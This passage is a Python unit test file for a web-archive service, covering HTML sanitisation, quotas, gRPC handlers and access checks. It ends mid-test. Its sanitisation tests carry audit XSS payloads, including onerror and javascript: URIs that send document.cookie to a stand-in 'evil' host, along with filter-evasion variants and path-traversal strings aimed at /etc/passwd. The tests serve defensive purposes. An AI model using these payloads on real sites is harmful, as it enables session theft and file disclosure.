"""Archive service unit tests - page processor, quota, servicer RPCs."""

import os
import sys
import tempfile
import threading
import unittest
from datetime import datetime, timedelta, timezone
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "shared"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "..", "shared", "proto_generated"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

# Stub out boto3/botocore before servicer imports them
sys.modules["boto3"] = MagicMock()
sys.modules["botocore"] = MagicMock()
sys.modules["botocore.config"] = MagicMock()

# ---------------------------------------------------------------------------
# Shared per-service module names: models/servicer/quota/page_processor exist
# in every service. Import this suite's copies ONCE and register them under a
# unique alias; tests/conftest.py re-points the shared sys.modules names per
# test so combined multi-suite pytest runs never use another service's code.
# ---------------------------------------------------------------------------
_PP_ALIAS = "_ppsvc_archive-service_"
if _PP_ALIAS + "models" not in sys.modules:
    for _name in ("models", "servicer", "quota", "page_processor"):
        sys.modules.pop(_name, None)

import archive_pb2
import grpc
import library_pb2
import models  # noqa: F401  -- register ORM tables on Base.metadata before create_all
import page_processor  # noqa: F401
import quota as _quota_mod  # noqa: F401  -- alias: local `quota` vars shadow the name
import servicer
from db import Base, db_session
from page_processor import sanitise_and_rewrite
from servicer import ArchiveServicer

for _name in ("models", "page_processor", "quota", "servicer"):
    sys.modules[_PP_ALIAS + _name] = sys.modules[_name]

# ---------------------------------------------------------------------------
# Page processor tests
# ---------------------------------------------------------------------------

class TestPageProcessor(unittest.TestCase):
    def test_rewrite_asset_refs(self):
        html = b'<html><img src="photo.jpg"><link href="style.css"></html>'
        asset_map = {"photo.jpg": "assets/photo.jpg", "style.css": "assets/style.css"}
        rewritten, _preview, _body = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"assets/photo.jpg", rewritten)
        self.assertIn(b"assets/style.css", rewritten)

    def test_preview_text_extraction(self):
        html = b"<html><body><p>Hello World</p></body></html>"
        _, preview, body = sanitise_and_rewrite(html, {})
        self.assertIn("Hello World", body)
        self.assertTrue(len(preview) <= 500)

    def test_empty_html(self):
        html = b""
        rewritten, _preview, _body = sanitise_and_rewrite(html, {})
        self.assertIsNotNone(rewritten)

    def test_no_matching_assets(self):
        html = b'<html><img src="other.png"></html>'
        asset_map = {"photo.jpg": "assets/photo.jpg"}
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"other.png", rewritten)
        self.assertNotIn(b"assets/photo.jpg", rewritten)

    def test_rewrite_mixed_asset_refs(self):
        """HTML with img, link, source, video, audio referencing assets."""
        html = (
            b'<html><head>'
            b'<link href="styles.css">'
            b'</head><body>'
            b'<img src="photo.jpg">'
            b'<source src="video.mp4">'
            b'<video src="clip.webm"></video>'
            b'<audio src="sound.mp3"></audio>'
            b'<img data-src="lazy.png">'
            b'</body></html>'
        )
        asset_map = {
            "styles.css": "assets/styles.css",
            "photo.jpg": "assets/photo.jpg",
            "video.mp4": "assets/video.mp4",
            "clip.webm": "assets/clip.webm",
            "sound.mp3": "assets/sound.mp3",
            "lazy.png": "assets/lazy.png",
        }
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        for orig, new in asset_map.items():
            self.assertIn(new.encode(), rewritten, f"{orig} should be rewritten to {new}")
        self.assertNotIn(b'src="photo.jpg"', rewritten)
        self.assertNotIn(b'href="styles.css"', rewritten)
        self.assertNotIn(b"<script", rewritten)

    def test_asset_with_query_params(self):
        html = b'<html><img src="photo.jpg?v=1&w=200"></html>'
        asset_map = {"photo.jpg": "assets/photo.jpg"}
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"assets/photo.jpg", rewritten)

    def test_rewrite_nested_asset_paths(self):
        """Full path matching for nested local paths like images/foo.jpg."""
        html = b'<html><img src="./images/photo.jpg"><link href="./styles/main.css"></html>'
        asset_map = {
            "images/photo.jpg": "assets/images/photo.jpg",
            "styles/main.css": "assets/styles/main.css",
        }
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertIn(b"assets/images/photo.jpg", rewritten)
        self.assertIn(b"assets/styles/main.css", rewritten)
        self.assertNotIn(b"./images/photo.jpg", rewritten)

    def test_rewrite_root_absolute_asset_refs(self):
        """Root-absolute references (e.g. Next.js /_next/...) must be rewritten
        to archive-relative paths so they resolve inside the archive folder
        rather than the host origin (which would 404). Script tags are stripped
        entirely (they can never run in the sandboxed viewer)."""
        html = (
            b'<html><head>'
            b'<script src="/_next/static/chunks/app.js"></script>'
            b'<link href="/_next/static/css/main.css">'
            b'</head><body>'
            b'<img src="/images/photo.jpg">'
            b'</body></html>'
        )
        asset_map = {
            "app.js": "assets/app.js",
            "main.css": "assets/main.css",
            "photo.jpg": "assets/photo.jpg",
        }
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        # Script tags are removed outright.
        self.assertNotIn(b"<script", rewritten)
        self.assertNotIn(b"app.js", rewritten)
        # Mapped assets resolve to the archive-relative path.
        self.assertIn(b"assets/main.css", rewritten)
        self.assertIn(b"assets/photo.jpg", rewritten)
        # No host-root absolute paths remain.
        self.assertNotIn(b'href="/_next', rewritten)
        self.assertNotIn(b'src="/images', rewritten)

    def test_rewrite_unmapped_root_absolute_stays_in_archive(self):
        """An unmapped root-absolute asset is made archive-relative (no leading
        slash) so the request stays within the archive namespace, not the host."""
        html = b'<html><img src="/_next/static/chunks/missing.js"></html>'
        rewritten, _, _ = sanitise_and_rewrite(html, {})
        self.assertIn(b'src="_next/static/chunks/missing.js"', rewritten)
        self.assertNotIn(b'src="/_next', rewritten)

    def test_external_and_anchor_urls_left_untouched(self):
        html = (
            b'<html><img src="https://cdn.example.com/a.png">'
            b'<a href="#section">x</a>'
            b'<img src="//cdn.example.com/b.png">'
            b'</html>'
        )
        rewritten, _, _ = sanitise_and_rewrite(html, {})
        self.assertIn(b"https://cdn.example.com/a.png", rewritten)
        self.assertIn(b'href="#section"', rewritten)
        self.assertIn(b"//cdn.example.com/b.png", rewritten)

    def test_removes_base_tags(self):
        """Base tags must be removed to prevent overriding relative paths."""
        html = b'<html><head><base href="https://example.com/"></head><body><img src="images/photo.jpg"></body></html>'
        asset_map = {"images/photo.jpg": "assets/images/photo.jpg"}
        rewritten, _, _ = sanitise_and_rewrite(html, asset_map)
        self.assertNotIn(b"<base", rewritten)
        self.assertIn(b"assets/images/photo.jpg", rewritten)

    def test_strips_script_tags(self):
        """All <script> tags (inline, external, JSON-LD) must be removed from stored HTML."""
        html = (
            b'<html><head><script src="app.js"></script>'
            b'<script type="application/ld+json">{"a":1}</script></head>'
            b'<body><p>Hi</p><script>alert(1)</script><img src="photo.jpg"></body></html>'
        )
        rewritten, _, body = sanitise_and_rewrite(html, {"photo.jpg": "assets/photo.jpg"})
        self.assertNotIn(b"<script", rewritten)
        self.assertNotIn(b"alert(1)", rewritten)
        self.assertNotIn(b"app.js", rewritten)
        self.assertIn(b"assets/photo.jpg", rewritten)
        self.assertIn("Hi", body)


# ---------------------------------------------------------------------------
# Helpers for quota and servicer tests
# ---------------------------------------------------------------------------

def _make_quota_dict(user_id="u1", pages=0, total_bytes=0, reset_at=None):
    """Return a plain dict-like mock that quota.check_and_reserve can use."""
    q = MagicMock()
    q.user_id = user_id
    q.pages_this_month = pages
    q.total_bytes = total_bytes
    q.quota_reset_at = reset_at or datetime.now(timezone.utc) + timedelta(days=30)
    return q


def _make_page(page_id="p1", user_id="u1", url="https://example.com",
               title="Test", preview_text="preview", r2_key="u1/p1/index.html",
               size_bytes=1000, extension_job_id="job1",
               archived_at=None):
    page = MagicMock()
    page.id = page_id
    page.user_id = user_id
    page.url = url
    page.title = title
    page.preview_text = preview_text
    page.r2_key = r2_key
    page.size_bytes = size_bytes
    page.extension_job_id = extension_job_id
    page.archived_at = archived_at or datetime.now(timezone.utc)
    return page


class _FakeContext:
    def __init__(self):
        self._code = None
        self._details = None

    def set_code(self, code):
        self._code = code

    def set_details(self, details):
        self._details = details


# ---------------------------------------------------------------------------
# Quota tests
# ---------------------------------------------------------------------------

class TestQuota(unittest.TestCase):
    """reserve_quota / confirm_quota / refund_quota (2.14 reserve-then-confirm).

    D9: every exhaustion detail carries the machine-readable ``exhausted:<kind>|``
    prefix ahead of the unchanged legacy human message (the monolith's
    fallback matching relies on that wording).
    """

    def test_reserve_under_quota_increments_counters(self):
        from quota import reserve_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=10, total_bytes=100)
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = reserve_quota(mock_session, "u1", "free", 1000)
        self.assertIsNone(result)
        self.assertEqual(quota.pages_this_month, 11)
        self.assertEqual(quota.total_bytes, 1100)

    def test_reserve_page_limit_exceeded_prefixed_and_untouched(self):
        from models import PLAN_LIMITS
        from quota import reserve_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=PLAN_LIMITS["free"]["pages_per_month"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = reserve_quota(mock_session, "u1", "free", 1000)
        self.assertEqual(result, "exhausted:quota|Monthly page limit reached")
        self.assertEqual(quota.pages_this_month, PLAN_LIMITS["free"]["pages_per_month"])
        self.assertEqual(quota.total_bytes, 0)

    def test_reserve_byte_limit_exceeded_prefixed_and_untouched(self):
        from models import PLAN_LIMITS
        from quota import reserve_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(total_bytes=PLAN_LIMITS["free"]["max_bytes"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = reserve_quota(mock_session, "u1", "free", 1)
        self.assertEqual(result, "exhausted:size|Storage limit reached")
        self.assertEqual(quota.total_bytes, PLAN_LIMITS["free"]["max_bytes"])

    def test_legacy_human_message_preserved_for_monolith_fallback(self):
        from models import PLAN_LIMITS
        from quota import reserve_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=PLAN_LIMITS["free"]["pages_per_month"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = reserve_quota(mock_session, "u1", "free", 1)
        self.assertIn("Monthly page limit reached", result)

    def test_reserve_pro_plan_higher_limits(self):
        from models import PLAN_LIMITS
        from quota import reserve_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=PLAN_LIMITS["free"]["pages_per_month"])
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = reserve_quota(mock_session, "u1", "pro", 1000)
        self.assertIsNone(result)
        self.assertEqual(quota.pages_this_month, PLAN_LIMITS["free"]["pages_per_month"] + 1)

    def test_reserve_monthly_rollover(self):
        from quota import reserve_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(
            pages=50,
            reset_at=datetime.now(timezone.utc) - timedelta(days=1),
        )
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = reserve_quota(mock_session, "u1", "free", 1000)
        self.assertIsNone(result)
        self.assertEqual(quota.pages_this_month, 1)  # reset to 0, then +1

    def test_reserve_new_user_creates_quota(self):
        from quota import reserve_quota
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        result = reserve_quota(mock_session, "new_user", "free", 1000)
        self.assertIsNone(result)
        mock_session.add.assert_called_once()

    def test_confirm_under_limits_keeps_reservation(self):
        from quota import confirm_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=11, total_bytes=1100)
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = confirm_quota(mock_session, "u1", "free", 1000)
        self.assertIsNone(result)
        self.assertEqual(quota.pages_this_month, 11)
        self.assertEqual(quota.total_bytes, 1100)

    def test_confirm_over_page_limit_refunds_reservation(self):
        """A concurrent ingest consumed the budget while this one uploaded."""
        from models import PLAN_LIMITS
        from quota import confirm_quota
        mock_session = MagicMock()
        limit = PLAN_LIMITS["free"]["pages_per_month"]
        quota = _make_quota_dict(pages=limit + 1, total_bytes=100)
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = confirm_quota(mock_session, "u1", "free", 1000)
        self.assertEqual(result, "exhausted:quota|Monthly page limit reached")
        self.assertEqual(quota.pages_this_month, limit)  # our +1 refunded

    def test_confirm_over_byte_limit_refunds_reservation(self):
        from models import PLAN_LIMITS
        from quota import confirm_quota
        mock_session = MagicMock()
        base = PLAN_LIMITS["free"]["max_bytes"] + 500
        quota = _make_quota_dict(pages=2, total_bytes=base)
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        result = confirm_quota(mock_session, "u1", "free", 1000)
        self.assertEqual(result, "exhausted:size|Storage limit reached")
        self.assertEqual(quota.total_bytes, base - 1000)
        self.assertEqual(quota.pages_this_month, 2)  # pages fine — untouched

    def test_refund_floors_at_zero(self):
        from quota import refund_quota
        mock_session = MagicMock()
        quota = _make_quota_dict(pages=0, total_bytes=5)
        mock_session.execute.return_value.scalar_one_or_none.return_value = quota
        refund_quota(mock_session, "u1", 1000)
        self.assertEqual(quota.pages_this_month, 0)
        self.assertEqual(quota.total_bytes, 0)


# ---------------------------------------------------------------------------
# Servicer tests
# ---------------------------------------------------------------------------

def _build_ingest_request(**overrides):
    defaults = {
        "user_id": "u1", "url": "https://example.com", "title": "Test",
        "html_content": b"<html><body>Hello</body></html>",
        "assets": [], "extension_job_id": "job1", "plan": "free",
    }
    defaults.update(overrides)
    return archive_pb2.IngestPageRequest(**defaults)


class TestIngestPage(unittest.TestCase):
    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.reserve_quota", return_value=None)
    @patch("servicer.confirm_quota", return_value=None)
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_ingest_success(self, mock_engine, mock_db_session, mock_confirm,
                            mock_reserve, mock_r2, mock_search):
        from servicer import ArchiveServicer
        mock_session = MagicMock()
        # First execute: idempotency check -> None (new page)
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None
        mock_r2.return_value.upload = MagicMock()

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = _build_ingest_request(assets=[
            archive_pb2.Asset(filename="photo.jpg", content_type="image/jpeg", data=b"\xff\xd8\xff"),
        ])
        resp = svc.IngestPage(req, ctx)

        self.assertTrue(resp.success)
        self.assertTrue(resp.page_id)
        # 1 asset + index.html + meta.json = 3 uploads
        self.assertEqual(mock_r2.return_value.upload.call_count, 3)
        # Reserve runs in its own short transaction before uploads (2.14)
        mock_reserve.assert_called_once()
        mock_confirm.assert_called_once()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_idempotent_replay(self, mock_engine, mock_db_session,
                               mock_r2, mock_search):
        """Second IngestPage with same extension_job_id returns existing page_id."""
        from servicer import ArchiveServicer
        existing_page = _make_page(page_id="existing-id")

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = existing_page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        resp = svc.IngestPage(_build_ingest_request(extension_job_id="job1"), ctx)

        self.assertTrue(resp.success)
        self.assertEqual(resp.page_id, "existing-id")
        mock_r2.return_value.upload.assert_not_called()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.reserve_quota",
           return_value="exhausted:quota|Monthly page limit reached")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_quota_exceeded_no_r2_write(self, mock_engine, mock_db_session,
                                        mock_reserve, mock_r2, mock_search):
        """When quota is exceeded, no R2 upload happens and the detail carries
        the machine-readable ``exhausted:quota|`` prefix (D9/1.15)."""
        import grpc
        from servicer import ArchiveServicer

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        resp = svc.IngestPage(_build_ingest_request(), ctx)

        self.assertFalse(resp.success)
        self.assertEqual(ctx._code, grpc.StatusCode.RESOURCE_EXHAUSTED)
        self.assertEqual(ctx._details, "exhausted:quota|Monthly page limit reached")
        mock_r2.return_value.upload.assert_not_called()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_invalid_extension_job_id_rejected(self, mock_engine, mock_db_session,
                                               mock_r2, mock_search):
        """2.1 defense in depth: malformed job id → INVALID_ARGUMENT, never a
        column-overflow 500."""
        import grpc
        from servicer import ArchiveServicer

        svc = ArchiveServicer()

        for bad in ("x" * 37, "has spaces", "job/id", "üñí"):
            ctx = _FakeContext()
            resp = svc.IngestPage(
                _build_ingest_request(extension_job_id=bad), ctx,
            )
            self.assertFalse(resp.success, bad)
            self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT, bad)
            mock_r2.return_value.upload.assert_not_called()

        # A 36-char UUID-shaped id passes the guard (reaches the quota path).
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        with patch("servicer.reserve_quota",
                   return_value="exhausted:quota|Monthly page limit reached"), \
             patch("servicer.db_session") as db_session_ctx:
            db_session_ctx.return_value.__enter__ = lambda s: mock_session
            db_session_ctx.return_value.__exit__ = lambda s, *a: None
            svc.IngestPage(
                _build_ingest_request(
                    extension_job_id="123e4567-e89b-12d3-a456-426614174000"
                ),
                ctx,
            )
        # Guard passed — the quota path answered instead of INVALID_ARGUMENT.
        self.assertEqual(ctx._code, grpc.StatusCode.RESOURCE_EXHAUSTED)


class TestCrossUserIsolation(unittest.TestCase):
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_page_wrong_user(self, mock_engine, mock_db_session, mock_r2):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetPageRequest(page_id="p1", user_id="attacker-u2")
        svc.GetPage(req, ctx)

        self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_page_content_wrong_user(self, mock_engine, mock_db_session, mock_r2):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetPageContentRequest(page_id="p1", user_id="attacker-u2")
        svc.GetPageContent(req, ctx)

        self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)
        mock_r2.return_value.presign.assert_not_called()

    @patch("servicer._get_search_stub", return_value=None)
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_delete_page_wrong_user(self, mock_engine, mock_db_session, mock_r2, mock_search):
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.DeletePageRequest(page_id="p1", user_id="attacker-u2")
        resp = svc.DeletePage(req, ctx)

        self.assertFalse(resp.success)
        self.assertEqual(resp.message, "not found")
        mock_r2.return_value.delete_prefix.assert_not_called()


class TestDeletePage(unittest.TestCase):
    @patch("servicer._get_search_stub")
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_delete_cleans_r2_and_quota(self, mock_engine, mock_db_session,
                                         mock_r2, mock_search):
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="u1", size_bytes=5000)
        quota_row = _make_quota_dict(user_id="u1", total_bytes=10000)

        mock_session = MagicMock()
        call_count = [0]

        def fake_execute(stmt):
            call_count[0] += 1
            result = MagicMock()
            if call_count[0] == 1:
                result.scalar_one_or_none.return_value = page
            else:
                result.scalar_one_or_none.return_value = quota_row
            return result

        mock_session.execute = fake_execute
        mock_session.delete = MagicMock()
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_search_stub = MagicMock()
        mock_search.return_value = mock_search_stub

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.DeletePageRequest(page_id="p1", user_id="u1")
        resp = svc.DeletePage(req, ctx)

        self.assertTrue(resp.success)

        # R2 prefix deleted
        mock_r2.return_value.delete_prefix.assert_called_once_with("u1/p1")

        # Thumbnail deleted
        mock_r2.return_value.delete.assert_called_once_with("u1/p1.webp")

        # Page row deleted
        mock_session.delete.assert_called_once_with(page)

        # Quota decremented
        self.assertEqual(quota_row.total_bytes, 5000)

        # Search removal called
        mock_search_stub.RemovePage.assert_called_once()


class TestGetArchiveFile(unittest.TestCase):
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_fetch_file_success(self, mock_engine, mock_db_session, mock_r2_cls):
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_r2 = MagicMock()
        mock_r2.bucket = "test-bucket"
        body = MagicMock()
        body.read.return_value = b"<html>data</html>"
        mock_r2.client.get_object.return_value = {
            "Body": body,
            "ContentType": "text/html; charset=utf-8",
        }
        mock_r2_cls.return_value = mock_r2

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="index.html",
        )
        resp = svc.GetArchiveFile(req, ctx)

        self.assertEqual(resp.data, b"<html>data</html>")
        self.assertEqual(resp.content_type, "text/html; charset=utf-8")
        mock_r2.client.get_object.assert_called_once_with(
            Bucket="test-bucket", Key="u1/p1/index.html",
        )

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_path_traversal_rejected(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        mock_r2_cls.return_value = MagicMock()
        svc = ArchiveServicer()

        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        # Reject paths with /.. traversal
        ctx = _FakeContext()
        req = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="foo/../../../etc/passwd",
        )
        svc.GetArchiveFile(req, ctx)
        self.assertEqual(ctx._code, grpc.StatusCode.INVALID_ARGUMENT)

        # Reject absolute paths
        ctx2 = _FakeContext()
        req2 = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="/etc/passwd",
        )
        svc.GetArchiveFile(req2, ctx2)
        self.assertEqual(ctx2._code, grpc.StatusCode.INVALID_ARGUMENT)

        # Allow filenames containing ".." without a slash (edge case)
        ctx3 = _FakeContext()
        req3 = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="assets/image..thumb.jpg",
        )
        page = _make_page(page_id="p1", user_id="u1")
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_r2 = MagicMock()
        mock_r2.bucket = "test-bucket"
        body = MagicMock()
        body.read.return_value = b"\xff\xd8\xff"
        mock_r2.client.get_object.return_value = {"Body": body, "ContentType": "image/jpeg"}
        svc.r2 = mock_r2

        svc.GetArchiveFile(req3, ctx3)
        self.assertIsNone(ctx3._code)  # No error set

    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_file_not_found_in_r2(self, mock_engine, mock_db_session, mock_r2_cls):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_db_session.return_value.__enter__ = lambda s: mock_session
        mock_db_session.return_value.__exit__ = lambda s, *a: None

        mock_r2 = MagicMock()
        mock_r2.bucket = "test-bucket"
        mock_r2.client.get_object.side_effect = Exception("NoSuchKey")
        mock_r2_cls.return_value = mock_r2

        svc = ArchiveServicer()
        ctx = _FakeContext()
        req = archive_pb2.GetArchiveFileRequest(
            page_id="p1", user_id="u1", file_path="assets/missing.jpg",
        )
        resp = svc.GetArchiveFile(req, ctx)

        self.assertEqual(ctx._code, grpc.StatusCode.NOT_FOUND)
        self.assertEqual(resp.data, b"")


# ---------------------------------------------------------------------------
# Sanitisation tests (2.7) — XSS payloads from the audit
# ---------------------------------------------------------------------------

class TestSanitisation(unittest.TestCase):
    def _sanitize(self, html: bytes, asset_map=None):
        return sanitise_and_rewrite(html, asset_map or {})[0]

    def test_inline_event_handler_removed(self):
        """Audit payload: onerror must be stripped, src preserved."""
        html = b'<html><img src="a.png" onerror="fetch(\'//evil?t=\'+document.cookie)"></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"onerror", rewritten)
        self.assertIn(b'src="a.png"', rewritten)

    def test_onclick_and_mixed_case_handlers_removed(self):
        html = b'<html><body><div onclick="evil()" ONMOUSEOVER="evil()">x</div></body></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"onclick", rewritten)
        self.assertNotIn(b"ONMOUSEOVER", rewritten)
        self.assertNotIn(b"evil()", rewritten)

    def test_javascript_uri_neutralized_anchor_text_kept(self):
        """Audit payload: javascript: href neutralized, anchor text preserved."""
        html = (
            b"<html><a href=\"javascript:document.location='//evil/'+document.cookie\">x</a></html>"
        )
        rewritten = self._sanitize(html)
        self.assertNotIn(b"javascript:", rewritten)
        self.assertNotIn(b"//evil/", rewritten)
        self.assertIn(b">x</a>", rewritten)

    def test_javascript_uri_evasions_caught(self):
        for payload in (
            b'JaVaScRiPt:alert(1)',
            b'java\tscript:alert(1)',
            b'java\nscript:alert(1)',
            b'  javascript:alert(1)',
            b'jav\x01ascript:alert(1)',
        ):
            html = b'<html><a href="' + payload + b'">x</a></html>'
            rewritten = self._sanitize(html)
            self.assertNotIn(b"alert(1)", rewritten, payload)

    def test_data_text_html_blocked(self):
        html = (
            b'<html><iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'
            b'<a href="data:text/html,<script>alert(1)</script>">y</a></html>'
        )
        rewritten = self._sanitize(html)
        self.assertNotIn(b"data:text/html", rewritten)
        self.assertNotIn(b"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg", rewritten)

    def test_data_image_uris_allowed(self):
        """Archived pages legitimately use inline data: images — preserved."""
        uri = b"data:image/png;base64,iVBORw0KGgo="
        html = b'<html><img src="' + uri + b'"></html>'
        rewritten = self._sanitize(html)
        self.assertIn(uri, rewritten)

    def test_svg_onload_removed(self):
        html = b'<html><svg onload="alert(1)"><circle r="1"/></svg></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"onload", rewritten)
        self.assertNotIn(b"alert(1)", rewritten)
        self.assertIn(b"<svg", rewritten)  # element itself survives

    def test_srcdoc_embed_removed(self):
        html = (
            b'<html><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe></html>'
        )
        rewritten = self._sanitize(html)
        self.assertNotIn(b"srcdoc", rewritten)
        self.assertNotIn(b"alert(1)", rewritten)

    def test_form_action_neutralized(self):
        html = b'<html><form action="javascript:fetch(\'//evil\')"><input type="submit"></form></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"javascript:", rewritten)
        self.assertIn(b"<form", rewritten)

    def test_xlink_href_neutralized(self):
        html = b'<html><svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg></html>'
        rewritten = self._sanitize(html)
        self.assertNotIn(b"javascript:", rewritten)

    def test_legitimate_content_survives(self):
        """Spec: nothing removed except scripts, handlers, dangerous URIs."""
        html = (
            b'<html><head><style>body{color:red}</style></head><body>'
            b'<p class="x">Hello</p><img src="photo.jpg" alt="pic">'
            b'<a href="https://example.com">link</a><form action="/go"></form>'
            b"</body></html>"
        )
        rewritten, _preview, body = sanitise_and_rewrite(
            html, {"photo.jpg": "assets/photo.jpg"}
        )
        self.assertIn(b"Hello", rewritten)
        self.assertIn(b'alt="pic"', rewritten)
        self.assertIn(b"https://example.com", rewritten)
        self.assertIn(b'action="/go"', rewritten)
        self.assertIn(b"assets/photo.jpg", rewritten)
        self.assertIn(b"Hello", body.encode() if isinstance(body, str) else body)


# ---------------------------------------------------------------------------
# Mandatory ownership (2.3): empty user_id is never a wildcard
# ---------------------------------------------------------------------------

class TestEmptyUserIdRejected(unittest.TestCase):
    @patch("servicer.R2Client")
    @patch("servicer.db_session")
    @patch("servicer.get_engine", return_value=MagicMock())
    def test_get_page_content_empty_user_id_invalid(self, mock_engine, mock_db_session, mock_r2):
        import grpc
        from servicer import ArchiveServicer

        page = _make_page(page_id="p1", user_id="owner-u1")
